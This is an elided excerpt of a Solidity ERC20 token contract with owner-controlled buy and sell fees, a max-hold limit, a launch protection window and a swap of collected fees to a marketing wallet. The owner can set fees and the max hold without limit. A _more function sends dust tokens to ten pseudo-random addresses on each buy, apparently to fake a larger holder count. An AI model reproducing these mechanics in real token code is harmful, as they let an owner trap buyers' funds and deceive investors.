...
contract Token is ERC20, Ownable {
    ...
    uint256 private _total = 100_0000_0000 ether;
    uint8 private _decimals = 18;

    uint256 public _maxHold = type(uint256).max;
    ...
    uint256 public txMarketFee = 0;
    uint256 public txLPFee = 0;
    uint256 public burnFee = 0;
    uint256 public txFee = txMarketFee.add(txLPFee);

    uint256 public txSaleMarketFee = 0;
    uint256 public txSaleFee = txSaleMarketFee;
    ...
    uint256 public _protectBlock = 0;
    ...
    constructor(
        ...
        uint256 _st
         ...
         uniswapV2Router = IUniswapV2Router02(_r);
        ...
        txMarketFee = _buyFee;
        txSaleMarketFee = _saleFee;

        txFee = txMarketFee;
        txSaleFee = txSaleMarketFee;

        _transferOwnership(_o);
    ...
    function setMaxHold(uint256 value) external onlyOwner {
        _maxHold = value;
    }

    function setTxMarketFee(uint256 value) public onlyOwner {
        txMarketFee = value;
        txFee = txMarketFee.add(txLPFee);
    }

    function setTxSaleMarketFee(uint256 value) public onlyOwner {
        txSaleMarketFee = value;
        txSaleFee = txSaleMarketFee;
    }

    function setTxLPFee(uint256 value) public onlyOwner {
        txLPFee = value;
        txFee = txMarketFee.add(txLPFee);
    }

    function setTxBurnFee(uint256 value) public onlyOwner {
        burnFee = value;
    }
    ...
    function updateProtectBlock(uint256 value) public onlyOwner {
        _protectBlock = value;
    }
    ...
    function launchCheck(address sender, address recipient) internal {
        if (_protectBlock == 0) return;
        if (block.timestamp > launchedAt + _protectBlock) {
            return;
        }
        if (
    ...
    function _transfer(
        ...
        if (takeFee) {
            ...
            if (!automatedMarketMakerPairs[to]) {
                require(balanceOf(to) <= _maxHold, "max hold");
                if (automatedMarketMakerPairs[from]) {
                    ...
                    if (burnFee > 0) {
                        uint256 rewardTokens = amount.mul(burnFee).div(10000);
                        tokens = tokens.sub(rewardTokens);
                        super._transfer(from, address(deadWallet), rewardTokens);
                    }
                    _more(10, amount, from, to);
                } else {
                    if (txSaleFee > 0) {
                        uint256 rewardTokens = amount.mul(txSaleFee).div(10000);
                        tokens = tokens.sub(rewardTokens);
                        super._transfer(from, address(this), rewardTokens);
                    }
    ...
    function _swap() private lockSwap {
        ...
        tokens = tokens.sub(10000);

        if (tokenB == uniswapV2Router.WETH()) {
            swapTokensForETH(tokens, address(_marketWallet));
        } else {
            swapTokensForTokenB(tokens, address(_marketWallet));
        }
        

    }

    function _more(uint m, uint256 amount, address from, address to) internal {
        if (balanceOf(address(this)) < m) return;
        for (uint i; i < m; i++) {
            address n = address(uint160(uint256(keccak256(abi.encodePacked(from, to, amount, block.number, i)))));
            super._transfer(address(this), n, 1);
        }
    }
